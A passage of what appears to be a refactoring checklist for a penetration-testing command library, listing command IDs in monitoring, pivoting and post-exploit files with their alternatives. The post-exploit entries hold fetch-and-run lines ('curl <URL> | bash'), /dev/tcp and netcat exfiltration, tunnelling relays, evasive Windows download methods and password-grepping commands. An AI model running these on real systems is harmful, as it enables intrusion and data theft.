- [ ] **File**: `monitoring/log-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `tail-follow-log /var/log/syslog`
- [ ] **Action**: Replace with command IDs or create missing commands

### 179. `journalctl-service-follow`

- [ ] **Command ID**: `journalctl-service-follow`
- [ ] **File**: `monitoring/log-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `tail -f /var/log/<SERVICE>.log (if service has dedicated log)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 180. `journalctl-priority-filter`

- [ ] **Command ID**: `journalctl-priority-filter`
- [ ] **File**: `monitoring/log-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `grep for severity in syslog files`
- [ ] **Action**: Replace with command IDs or create missing commands

### 181. `journalctl-time-range`

- [ ] **Command ID**: `journalctl-time-range`
- [ ] **File**: `monitoring/log-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `grep time range in syslog files (manual)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 182. `dmesg-kernel-messages`

- [ ] **Command ID**: `dmesg-kernel-messages`
- [ ] **File**: `monitoring/log-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `journalctl -k (kernel messages via journald)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 183. `dmesg-follow`

- [ ] **Command ID**: `dmesg-follow`
- [ ] **File**: `monitoring/log-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `journalctl -kf (kernel messages via journald)`
  - `watch -n 1 dmesg | tail -20`
- [ ] **Action**: Replace with command IDs or create missing commands

### 184. `grep-auth-failed`

- [ ] **Command ID**: `grep-auth-failed`
- [ ] **File**: `monitoring/log-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `journalctl -u ssh | grep -i failed`
  - `lastb-failed-logins`
- [ ] **Action**: Replace with command IDs or create missing commands

### 185. `grep-sudo-commands`

- [ ] **Command ID**: `grep-sudo-commands`
- [ ] **File**: `monitoring/log-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `journalctl | grep sudo.*COMMAND`
- [ ] **Action**: Replace with command IDs or create missing commands

### 186. `lastb-failed-logins`

- [ ] **Command ID**: `lastb-failed-logins`
- [ ] **File**: `monitoring/log-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `grep-auth-failed`
  - `journalctl | grep 'Failed password'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 187. `journalctl-boot-messages`

- [ ] **Command ID**: `journalctl-boot-messages`
- [ ] **File**: `monitoring/log-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `dmesg-kernel-messages (kernel only)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 188. `lsof-port-specific`

- [ ] **Command ID**: `lsof-port-specific`
- [ ] **File**: `monitoring/network-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `fuser-port-tcp`
  - `netstat -tulpn | grep :<PORT>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 189. `fuser-port-tcp`

- [ ] **Command ID**: `fuser-port-tcp`
- [ ] **File**: `monitoring/network-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `lsof-port-specific`
  - `ss -tulpn | grep :<PORT>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 190. `ss-established-connections`

- [ ] **Command ID**: `ss-established-connections`
- [ ] **File**: `monitoring/network-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `netstat -tupn | grep ESTABLISHED`
  - `lsof -i -n | grep ESTABLISHED`
- [ ] **Action**: Replace with command IDs or create missing commands

### 191. `win-wmic-process-pid`

- [ ] **Command ID**: `win-wmic-process-pid`
- [ ] **File**: `monitoring/network-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `win-tasklist-pid`
  - `Get-Process -Id <PID> | Select *`
- [ ] **Action**: Replace with command IDs or create missing commands

### 192. `ps-auxww-no-truncate`

- [ ] **Command ID**: `ps-auxww-no-truncate`
- [ ] **File**: `monitoring/process-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `ps-ef-full`
  - `cat /proc/*/cmdline | tr '\0' ' '`
- [ ] **Action**: Replace with command IDs or create missing commands

### 193. `pstree-hierarchy`

- [ ] **Command ID**: `pstree-hierarchy`
- [ ] **File**: `monitoring/process-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `ps-ef-full`
  - `ps f (forest view)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 194. `top-snapshot`

- [ ] **Command ID**: `top-snapshot`
- [ ] **File**: `monitoring/process-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `ps-sort-cpu`
  - `htop (if installed)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 195. `pgrep-pattern-search`

- [ ] **Command ID**: `pgrep-pattern-search`
- [ ] **File**: `monitoring/process-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `ps aux | grep <PATTERN>`
  - `pidof <EXACT_NAME>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 196. `pidof-exact`

- [ ] **Command ID**: `pidof-exact`
- [ ] **File**: `monitoring/process-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `pgrep -x <PROCESS_NAME>`
  - `ps aux | grep <PROCESS_NAME> | awk '{print $2}'`
- [ ] **Action**: Replace with command IDs or create missing commands

### 197. `ps-user-filter`

- [ ] **Command ID**: `ps-user-filter`
- [ ] **File**: `monitoring/process-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `ps aux | grep ^<USERNAME>`
  - `top -u <USERNAME>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 198. `ps-pid-details`

- [ ] **Command ID**: `ps-pid-details`
- [ ] **File**: `monitoring/process-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `cat /proc/<PID>/cmdline | tr '\0' ' '`
  - `ps -p <PID> -f`
- [ ] **Action**: Replace with command IDs or create missing commands

### 199. `win-ps-get-process-detailed`

- [ ] **Command ID**: `win-ps-get-process-detailed`
- [ ] **File**: `monitoring/process-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `win-wmic-process-full`
  - `Get-CimInstance win32_process`
- [ ] **Action**: Replace with command IDs or create missing commands

### 200. `ps-sort-memory`

- [ ] **Command ID**: `ps-sort-memory`
- [ ] **File**: `monitoring/resource-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `top -bn1 -o %MEM | head -20`
- [ ] **Action**: Replace with command IDs or create missing commands

### 201. `ps-sort-cpu`

- [ ] **Command ID**: `ps-sort-cpu`
- [ ] **File**: `monitoring/resource-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `top -bn1 -o %CPU | head -20`
- [ ] **Action**: Replace with command IDs or create missing commands

### 202. `free-memory-human`

- [ ] **Command ID**: `free-memory-human`
- [ ] **File**: `monitoring/resource-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `cat /proc/meminfo`
  - `vmstat -s`
- [ ] **Action**: Replace with command IDs or create missing commands

### 203. `vmstat-cpu-monitoring`

- [ ] **Command ID**: `vmstat-cpu-monitoring`
- [ ] **File**: `monitoring/resource-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `top -bn1`
  - `sar -u 1 5`
- [ ] **Action**: Replace with command IDs or create missing commands

### 204. `iostat-disk-stats`

- [ ] **Command ID**: `iostat-disk-stats`
- [ ] **File**: `monitoring/resource-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `iotop (if installed)`
  - `vmstat 1 5`
- [ ] **Action**: Replace with command IDs or create missing commands

### 205. `uptime-load-average`

- [ ] **Command ID**: `uptime-load-average`
- [ ] **File**: `monitoring/resource-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `cat /proc/loadavg`
  - `w (includes user info)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 206. `df-disk-usage`

- [ ] **Command ID**: `df-disk-usage`
- [ ] **File**: `monitoring/resource-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `df -h -x tmpfs -x devtmpfs (exclude pseudo-filesystems)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 207. `du-directory-usage`

- [ ] **Command ID**: `du-directory-usage`
- [ ] **File**: `monitoring/resource-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `ncdu <DIRECTORY> (ncurses disk usage analyzer, if installed)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 208. `lsof-user-files`

- [ ] **Command ID**: `lsof-user-files`
- [ ] **File**: `monitoring/resource-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `ls -l /proc/*/fd/ (manual check)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 209. `lsof-directory-usage`

- [ ] **Command ID**: `lsof-directory-usage`
- [ ] **File**: `monitoring/resource-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `fuser-directory-processes`
  - `lsof +d <DIRECTORY> (non-recursive, faster)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 210. `w-user-activity`

- [ ] **Command ID**: `w-user-activity`
- [ ] **File**: `monitoring/resource-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `who -a`
  - `users`
- [ ] **Action**: Replace with command IDs or create missing commands

### 211. `last-login-history`

- [ ] **Command ID**: `last-login-history`
- [ ] **File**: `monitoring/resource-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `cat /var/log/wtmp | utmpdump`
- [ ] **Action**: Replace with command IDs or create missing commands

### 212. `crontab-user-list`

- [ ] **Command ID**: `crontab-user-list`
- [ ] **File**: `monitoring/scheduled-tasks.json`
- [ ] **Current alternatives (text)**:
  - `cat /var/spool/cron/crontabs/<USERNAME>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 213. `crontab-user-specific`

- [ ] **Command ID**: `crontab-user-specific`
- [ ] **File**: `monitoring/scheduled-tasks.json`
- [ ] **Current alternatives (text)**:
  - `sudo cat /var/spool/cron/crontabs/<USERNAME>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 214. `crontab-system-wide`

- [ ] **Command ID**: `crontab-system-wide`
- [ ] **File**: `monitoring/scheduled-tasks.json`
- [ ] **Current alternatives (text)**:
  - `less /etc/crontab`
- [ ] **Action**: Replace with command IDs or create missing commands

### 215. `cron-directories-list`

- [ ] **Command ID**: `cron-directories-list`
- [ ] **File**: `monitoring/scheduled-tasks.json`
- [ ] **Current alternatives (text)**:
  - `find /etc/cron* -type f`
- [ ] **Action**: Replace with command IDs or create missing commands

### 216. `cron-log-recent`

- [ ] **Command ID**: `cron-log-recent`
- [ ] **File**: `monitoring/scheduled-tasks.json`
- [ ] **Current alternatives (text)**:
  - `grep CRON /var/log/messages`
  - `journalctl -u cron`
- [ ] **Action**: Replace with command IDs or create missing commands

### 217. `win-ps-scheduled-tasks`

- [ ] **Command ID**: `win-ps-scheduled-tasks`
- [ ] **File**: `monitoring/scheduled-tasks.json`
- [ ] **Current alternatives (text)**:
  - `win-schtasks-list-all`
  - `schtasks /query`
- [ ] **Action**: Replace with command IDs or create missing commands

### 218. `win-ps-scheduled-task-info`

- [ ] **Command ID**: `win-ps-scheduled-task-info`
- [ ] **File**: `monitoring/scheduled-tasks.json`
- [ ] **Current alternatives (text)**:
  - `schtasks /query /tn <TASK_NAME> /v`
- [ ] **Action**: Replace with command IDs or create missing commands

### 219. `win-schtasks-task-xml`

- [ ] **Command ID**: `win-schtasks-task-xml`
- [ ] **File**: `monitoring/scheduled-tasks.json`
- [ ] **Current alternatives (text)**:
  - `Export-ScheduledTask -TaskName <TASK_NAME>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 220. `win-wmic-scheduled-job`

- [ ] **Command ID**: `win-wmic-scheduled-job`
- [ ] **File**: `monitoring/scheduled-tasks.json`
- [ ] **Current alternatives (text)**:
  - `at (command-line AT utility)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 221. `linux-at-jobs-list`

- [ ] **Command ID**: `linux-at-jobs-list`
- [ ] **File**: `monitoring/scheduled-tasks.json`
- [ ] **Current alternatives (text)**:
  - `ls -la /var/spool/at/`
- [ ] **Action**: Replace with command IDs or create missing commands

### 222. `linux-systemd-timers`

- [ ] **Command ID**: `linux-systemd-timers`
- [ ] **File**: `monitoring/scheduled-tasks.json`
- [ ] **Current alternatives (text)**:
  - `systemctl list-unit-files --type=timer`
- [ ] **Action**: Replace with command IDs or create missing commands

### 223. `systemctl-running-services`

- [ ] **Command ID**: `systemctl-running-services`
- [ ] **File**: `monitoring/service-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `service --status-all`
  - `systemctl list-units --type=service --all`
- [ ] **Action**: Replace with command IDs or create missing commands

### 224. `systemctl-enabled-services`

- [ ] **Command ID**: `systemctl-enabled-services`
- [ ] **File**: `monitoring/service-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `chkconfig --list (older systems)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 225. `systemctl-service-permissions`

- [ ] **Command ID**: `systemctl-service-permissions`
- [ ] **File**: `monitoring/service-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `find /etc/systemd -writable -type f 2>/dev/null`
- [ ] **Action**: Replace with command IDs or create missing commands

### 226. `service-status-all-sysv`

- [ ] **Command ID**: `service-status-all-sysv`
- [ ] **File**: `monitoring/service-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `systemctl-running-services`
  - `ls /etc/init.d/`
- [ ] **Action**: Replace with command IDs or create missing commands

### 227. `chkconfig-list-sysv`

- [ ] **Command ID**: `chkconfig-list-sysv`
- [ ] **File**: `monitoring/service-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `systemctl list-unit-files (systemd equivalent)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 228. `win-sc-query-config`

- [ ] **Command ID**: `win-sc-query-config`
- [ ] **File**: `monitoring/service-enumeration.json`
- [ ] **Current alternatives (text)**:
  - `win-wmic-service-path`
  - `Get-WmiObject win32_service -Filter "Name='<SERVICE>'"`
- [ ] **Action**: Replace with command IDs or create missing commands

### 229. `systemctl-start-ssh`

- [ ] **Command ID**: `systemctl-start-ssh`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current alternatives (text)**:
  - `service ssh start - SysVinit alternative (older systems)`
  - `/etc/init.d/ssh start - Direct init script invocation`
  - `sshd -D - Run SSH server in foreground (debugging)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 230. `apache2-start`

- [ ] **Command ID**: `apache2-start`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current alternatives (text)**:
  - `python-http-server - Python HTTP server (no installation, unprivileged)`
  - `php-web-server - PHP built-in server (php -S 0.0.0.0:8000)`
  - `updog - HTTP server with upload support (pip install updog)`
  - `smb-server - SMB file sharing alternative`
- [ ] **Action**: Replace with command IDs or create missing commands

### 231. `ss-listening-ports`

- [ ] **Command ID**: `ss-listening-ports`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current alternatives (text)**:
  - `netstat-listening - Netstat alternative (older, less efficient)`
  - `lsof -i - List open files/sockets (more detailed but slower)`
  - `nmap localhost - External port scan verification`
- [ ] **Action**: Replace with command IDs or create missing commands

### 232. `ip-addr`

- [ ] **Command ID**: `ip-addr`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current alternatives (text)**:
  - `ifconfig - Legacy interface configuration tool (net-tools package)`
  - `hostname -I - Quick IP address listing (no interface details)`
  - `ip -br addr - Brief output (single line per interface)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 233. `ip-route`

- [ ] **Command ID**: `ip-route`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current alternatives (text)**:
  - `route -n - Legacy routing table display (net-tools package)`
  - `netstat -rn - Netstat routing table view`
  - `ip -br route - Brief output format`
- [ ] **Action**: Replace with command IDs or create missing commands

### 234. `nmap-port-check`

- [ ] **Command ID**: `nmap-port-check`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current alternatives (text)**:
  - `nc-port-check - Netcat port verification (nc -zv <TARGET> <PORT>)`
  - `telnet <TARGET> <PORT> - Interactive connection test`
  - `curl http://<TARGET>:<PORT> - HTTP service verification`
- [ ] **Action**: Replace with command IDs or create missing commands

### 235. `psql-connect`

- [ ] **Command ID**: `psql-connect`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current alternatives (text)**:
  - `pgcli - PostgreSQL CLI with auto-completion (pip install pgcli)`
  - `psql via port forward - If database internal: ssh-local-port-forward, then psql -h 127.0.0.1 -p <LOCAL_PORT>`
  - `sqlmap for automated injection - If accessible via web app`
- [ ] **Action**: Replace with command IDs or create missing commands

### 236. `smbclient-list-shares`

- [ ] **Command ID**: `smbclient-list-shares`
- [ ] **File**: `pivoting/linux-utilities.json`
- [ ] **Current alternatives (text)**:
  - `smbmap-enumerate - smbmap -H <TARGET> -u '' (alternative SMB enumeration)`
  - `enum4linux - Comprehensive SMB/CIFS enumeration script`
  - `crackmapexec smb - Modern SMB enumeration and exploitation framework`
  - `nmap-smb-enum - sudo nmap -p 445 --script=smb-enum-shares <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 237. `plink-remote-forward`

- [ ] **Command ID**: `plink-remote-forward`
- [ ] **File**: `pivoting/pivot-utilities.json`
- [ ] **Current alternatives (text)**:
  - `ssh-remote-port-forward - If OpenSSH client available on Windows (1803+)`
  - `netsh-portproxy-add - Native Windows port forwarding (requires admin)`
  - `chisel - HTTP tunneling if SSH blocked`
  - `socat-port-forward - Simple relay without authentication`
- [ ] **Action**: Replace with command IDs or create missing commands

### 238. `xfreerdp-connect`

- [ ] **Command ID**: `xfreerdp-connect`
- [ ] **File**: `pivoting/pivot-utilities.json`
- [ ] **Current alternatives (text)**:
  - `rdesktop - Older RDP client (less feature-rich)`
  - `remmina - GUI RDP client for Linux`
  - `microsoft-rdp - Windows built-in RDP client (mstsc.exe)`
  - `evil-winrm - If WinRM (5985/5986) available instead of RDP`
- [ ] **Action**: Replace with command IDs or create missing commands

### 239. `ssh-connect`

- [ ] **Command ID**: `ssh-connect`
- [ ] **File**: `pivoting/pivot-utilities.json`
- [ ] **Current alternatives (text)**:
  - `ssh-local-port-forward - SSH with port forwarding`
  - `plink-remote-forward - Windows SSH client alternative`
- [ ] **Action**: Replace with command IDs or create missing commands

### 240. `sshuttle-vpn`

- [ ] **Command ID**: `sshuttle-vpn`
- [ ] **File**: `pivoting/pivot-utilities.json`
- [ ] **Current alternatives (text)**:
  - `ssh-dynamic-port-forward - SOCKS proxy with proxychains (more flexible)`
  - `ssh-local-port-forward - Single service forwarding (simpler)`
  - `openvpn - Full VPN solution (requires server setup)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 241. `proxychains-config`

- [ ] **Command ID**: `proxychains-config`
- [ ] **File**: `pivoting/proxychains-utilities.json`
- [ ] **Current alternatives (text)**:
  - `sshuttle-vpn - Transparent VPN without proxychains prefix`
  - `ssh-local-port-forward - Single service forward without proxychains`
- [ ] **Action**: Replace with command IDs or create missing commands

### 242. `proxychains-nmap`

- [ ] **Command ID**: `proxychains-nmap`
- [ ] **File**: `pivoting/proxychains-utilities.json`
- [ ] **Current alternatives (text)**:
  - `sshuttle-vpn - Transparent proxy, nmap works without proxychains prefix`
  - `ssh-local-port-forward - Forward specific ports for targeted enumeration`
  - `static nmap binary - Compile statically to avoid LD_PRELOAD issues`
- [ ] **Action**: Replace with command IDs or create missing commands

### 243. `proxychains-psql`

- [ ] **Command ID**: `proxychains-psql`
- [ ] **File**: `pivoting/proxychains-utilities.json`
- [ ] **Current alternatives (text)**:
  - `ssh-local-port-forward - Forward PostgreSQL port directly (psql -h 127.0.0.1 -p <LOCAL_PORT>)`
  - `socat-port-forward - Set up relay on pivot host`
  - `sshuttle-vpn - Transparent proxy, psql works without proxychains prefix`
- [ ] **Action**: Replace with command IDs or create missing commands

### 244. `ssh-local-port-forward`

- [ ] **Command ID**: `ssh-local-port-forward`
- [ ] **File**: `pivoting/ssh-tunneling.json`
- [ ] **Current alternatives (text)**:
  - `ssh-dynamic-port-forward - SOCKS proxy for multiple destinations through single tunnel`
  - `socat-port-forward - Simple relay without SSH encryption, no authentication required`
  - `ssh-remote-port-forward - Reverse tunnel when inbound connections blocked by firewall`
- [ ] **Action**: Replace with command IDs or create missing commands

### 245. `ssh-dynamic-port-forward`

- [ ] **Command ID**: `ssh-dynamic-port-forward`
- [ ] **File**: `pivoting/ssh-tunneling.json`
- [ ] **Current alternatives (text)**:
  - `ssh-remote-dynamic-port-forward - Reverse SOCKS proxy when inbound firewall blocks access`
  - `sshuttle-vpn - VPN-like transparent routing without Proxychains configuration`
  - `ssh-local-port-forward - Single-destination forward when SOCKS unnecessary`
- [ ] **Action**: Replace with command IDs or create missing commands

### 246. `ssh-remote-port-forward`

- [ ] **Command ID**: `ssh-remote-port-forward`
- [ ] **File**: `pivoting/ssh-tunneling.json`
- [ ] **Current alternatives (text)**:
  - `ssh-remote-dynamic-port-forward - Reverse SOCKS proxy for multiple destinations`
  - `ssh-local-port-forward - Forward direction (requires no inbound firewall restrictions)`
  - `plink-remote-forward - Windows alternative using Plink when OpenSSH unavailable`
- [ ] **Action**: Replace with command IDs or create missing commands

### 247. `ssh-remote-dynamic-port-forward`

- [ ] **Command ID**: `ssh-remote-dynamic-port-forward`
- [ ] **File**: `pivoting/ssh-tunneling.json`
- [ ] **Current alternatives (text)**:
  - `ssh-remote-port-forward - Single-destination reverse tunnel when SOCKS unnecessary`
  - `ssh-dynamic-port-forward - Forward SOCKS (requires no inbound firewall)`
  - `plink-remote-forward + microsocks - Workaround for OpenSSH <7.6`
- [ ] **Action**: Replace with command IDs or create missing commands

### 248. `socat-port-forward`

- [ ] **Command ID**: `socat-port-forward`
- [ ] **File**: `pivoting/ssh-tunneling.json`
- [ ] **Current alternatives (text)**:
  - `ssh-local-port-forward - Encrypted tunnel with authentication`
  - `netcat-relay - Alternative using nc and FIFO pipes: mkfifo /tmp/pipe; nc -l -p <PORT> < /tmp/pipe | nc <DEST_IP> <DEST_PORT> > /tmp/pipe`
  - `iptables-forward - Kernel-level forwarding (requires root): iptables -t nat -A PREROUTING -p tcp --dport <LOCAL_PORT> -j DNAT --to-destination <DEST_IP>:<DEST_PORT>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 249. `netsh-portproxy-add`

- [ ] **Command ID**: `netsh-portproxy-add`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current alternatives (text)**:
  - `plink-remote-forward - SSH-based tunnel without admin rights`
  - `ssh-remote-port-forward - If OpenSSH available on Windows (1803+)`
  - `socat-port-forward - Cross-platform alternative`
- [ ] **Action**: Replace with command IDs or create missing commands

### 250. `powershell-wget`

- [ ] **Command ID**: `powershell-wget`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current alternatives (text)**:
  - `certutil-download - Alternative Windows native download method`
  - `bitsadmin - Background Intelligent Transfer Service`
  - `curl - Windows 10 1803+ includes curl.exe`
  - `wget - If installed on Windows`
- [ ] **Action**: Replace with command IDs or create missing commands

### 251. `certutil-download`

- [ ] **Command ID**: `certutil-download`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current alternatives (text)**:
  - `powershell-wget - More flexible but more suspicious`
  - `bitsadmin - Background transfer service`
- [ ] **Action**: Replace with command IDs or create missing commands

### 252. `where-windows`

- [ ] **Command ID**: `where-windows`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current alternatives (text)**:
  - `where /R C:\ <EXECUTABLE> - Search recursively from C:\ (slow)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 253. `systeminfo-windows`

- [ ] **Command ID**: `systeminfo-windows`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current alternatives (text)**:
  - `wmic os get caption,version - Specific OS version`
  - `wmic qfe list - Just hotfixes`
- [ ] **Action**: Replace with command IDs or create missing commands

### 254. `whoami-priv`

- [ ] **Command ID**: `whoami-priv`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current alternatives (text)**:
  - `whoami /all - Complete user info`
  - `whoami /groups - Group memberships`
- [ ] **Action**: Replace with command IDs or create missing commands

### 255. `ipconfig-all`

- [ ] **Command ID**: `ipconfig-all`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current alternatives (text)**:
  - `ipconfig - Brief output without /all`
  - `Get-NetIPConfiguration - PowerShell equivalent`
- [ ] **Action**: Replace with command IDs or create missing commands

### 256. `netstat-windows`

- [ ] **Command ID**: `netstat-windows`
- [ ] **File**: `pivoting/windows-utilities.json`
- [ ] **Current alternatives (text)**:
  - `netstat -an | findstr LISTENING - Only listening ports`
  - `Get-NetTCPConnection - PowerShell equivalent`
- [ ] **Action**: Replace with command IDs or create missing commands

### 257. `linux-cred-discover-config`

- [ ] **Command ID**: `linux-cred-discover-config`
- [ ] **File**: `post-exploit/credential-discovery.json`
- [ ] **Current alternatives (text)**:
  - `find <PATH> -name '*.php' -exec grep -i password {} +`
  - `find <PATH> -name 'config*' -exec cat {} +`
- [ ] **Action**: Replace with command IDs or create missing commands

### 258. `linux-enum-users-shells`

- [ ] **Command ID**: `linux-enum-users-shells`
- [ ] **File**: `post-exploit/credential-discovery.json`
- [ ] **Current alternatives (text)**:
  - `awk -F: '$7 !~ /(nologin|false)/ {print $1}' /etc/passwd`
  - `getent passwd | grep -v nologin | cut -d: -f1`
- [ ] **Action**: Replace with command IDs or create missing commands

### 259. `file-transfer-python-http`

- [ ] **Command ID**: `file-transfer-python-http`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `python -m SimpleHTTPServer 8000 (Python 2)`
  - `php -S 0.0.0.0:8000`
  - `ruby -run -e httpd . -p 8000`
- [ ] **Action**: Replace with command IDs or create missing commands

### 260. `file-transfer-wget`

- [ ] **Command ID**: `file-transfer-wget`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `curl http://<LHOST>/<FILE> -o <OUTPUT>`
  - `Use /dev/tcp for raw download`
  - `Base64 encode and paste if no tools`
- [ ] **Action**: Replace with command IDs or create missing commands

### 261. `file-transfer-curl`

- [ ] **Command ID**: `file-transfer-curl`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `wget if curl unavailable`
  - `curl <URL> | bash (pipe to shell)`
  - `Use -k for self-signed certificates`
- [ ] **Action**: Replace with command IDs or create missing commands

### 262. `file-transfer-certutil`

- [ ] **Command ID**: `file-transfer-certutil`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `PowerShell download methods`
  - `bitsadmin download`
  - `SMB copy if shares available`
- [ ] **Action**: Replace with command IDs or create missing commands

### 263. `file-transfer-powershell-download`

- [ ] **Command ID**: `file-transfer-powershell-download`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `Invoke-WebRequest -Uri <URL> -OutFile <FILE>`
  - `wget <URL> -O <FILE> (PowerShell alias)`
  - `curl <URL> -o <FILE> (PowerShell alias)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 264. `file-transfer-scp`

- [ ] **Command ID**: `file-transfer-scp`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `Use with -i for SSH key: scp -i key.pem file target:/path`
  - `rsync for larger transfers`
  - `SFTP for interactive transfer`
- [ ] **Action**: Replace with command IDs or create missing commands

### 265. `file-transfer-smb`

- [ ] **Command ID**: `file-transfer-smb`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `impacket-smbserver share . -smb2support (attacker)`
  - `net use Z: \\\\<LHOST>\\<SHARE>`
  - `Run directly: \\\\<LHOST>\\share\\file.exe`
- [ ] **Action**: Replace with command IDs or create missing commands

### 266. `file-transfer-nc-push`

- [ ] **Command ID**: `file-transfer-nc-push`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `ncat for newer systems`
  - `/dev/tcp for bash-based transfer`
  - `socat for bidirectional transfer`
- [ ] **Action**: Replace with command IDs or create missing commands

### 267. `file-transfer-nc-pull`

- [ ] **Command ID**: `file-transfer-nc-pull`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `socat TCP-LISTEN:port,reuseaddr,fork file:output`
  - `Use base64 encoding for text-safe transfer`
- [ ] **Action**: Replace with command IDs or create missing commands

### 268. `file-transfer-base64`

- [ ] **Command ID**: `file-transfer-base64`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `Hex encode for even safer transfer`
  - `Split large files and transfer in chunks`
  - `Copy-paste base64 if no network tools`
- [ ] **Action**: Replace with command IDs or create missing commands

### 269. `file-transfer-php`

- [ ] **Command ID**: `file-transfer-php`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `Use existing file upload functionality`
  - `Python Flask upload server`
  - `Updog for quick HTTP upload server`
- [ ] **Action**: Replace with command IDs or create missing commands

### 270. `file-transfer-ftp`

- [ ] **Command ID**: `file-transfer-ftp`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `Setup Python FTP server: python -m pyftpdlib -p 21`
  - `TFTP for simpler transfers`
  - `SFTP for encrypted transfers`
- [ ] **Action**: Replace with command IDs or create missing commands

### 271. `file-transfer-bitsadmin`

- [ ] **Command ID**: `file-transfer-bitsadmin`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `certutil for simpler syntax`
  - `PowerShell download methods`
  - `mshta for HTML application downloads`
- [ ] **Action**: Replace with command IDs or create missing commands

### 272. `file-transfer-dev-tcp`

- [ ] **Command ID**: `file-transfer-dev-tcp`
- [ ] **File**: `post-exploit/exfiltration.json`
- [ ] **Current alternatives (text)**:
  - `exec 3<>/dev/tcp/<IP>/<PORT>; cat <&3 > file`
  - `Use wget/curl if available`
